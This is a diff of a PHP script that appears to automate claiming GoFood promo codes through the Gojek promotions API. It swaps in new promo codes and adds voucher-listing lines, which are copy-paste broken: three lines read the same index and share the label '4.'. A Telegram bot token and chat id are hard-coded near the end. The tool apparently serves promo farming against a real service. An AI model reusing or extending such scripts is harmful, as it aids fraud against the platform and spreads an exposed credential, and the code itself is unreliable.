@@ -37,7 +37,7 @@ function change(){
         echo color("yellow",".");
         sleep(1);
         }
-        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA07"}');
+        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODSANTAI19"}');
         $message = fetch_value($code1,'"message":"','"');
         if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
         echo "\n".color("green","+] Message: ".$message);
@@ -51,7 +51,7 @@ function change(){
         sleep(1);
         }
         sleep(3);
-        $boba10 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA10"}');
+        $boba10 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBSANTAI11"}');
         $messageboba10 = fetch_value($boba10,'"message":"','"');
         if(strpos($boba10, 'Promo kamu sudah bisa dipakai.')){
         echo "\n".color("green","+] Message: ".$messageboba10);
@@ -65,7 +65,7 @@ function change(){
         sleep(1);
         }
         sleep(3);
-        $boba19 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA19"}');
+        $boba19 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODSANTAI08"}');
         $messageboba19 = fetch_value($boba19,'"message":"','"');
         if(strpos($boba19, 'Promo kamu sudah bisa dipakai.')){
         echo "\n".color("green","+] Message: ".$messageboba19);
@@ -100,15 +100,24 @@ function change(){
         $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
         $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
         $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
+	$voucher5 = getStr1('"title":"','",',$cekvoucher,"4");
+	$voucher6 = getStr1('"title":"','",',$cekvoucher,"4");
+	$voucher7 = getStr1('"title":"','",',$cekvoucher,"4");
         echo "\n".color("yellow","!] Total voucher ".$total." : ");
         echo color("green","1. ".$voucher1);
         echo "\n".color("green","                     2. ".$voucher2);
         echo "\n".color("green","                     3. ".$voucher3);
         echo "\n".color("green","                     4. ".$voucher4);
+	echo "\n".color("green","                     4. ".$voucher5);
+	echo "\n".color("green","                     4. ".$voucher6);
+	echo "\n".color("green","                     4. ".$voucher7);
         $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
         $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
         $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
         $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
+	$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
+	$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
+	$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
                                         $TOKEN  = "931114159:AAGK4O3nuld9uNw_IneDcSPVxYDGAaaazvQ";
 					$chatid = "905644289";
                                         if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
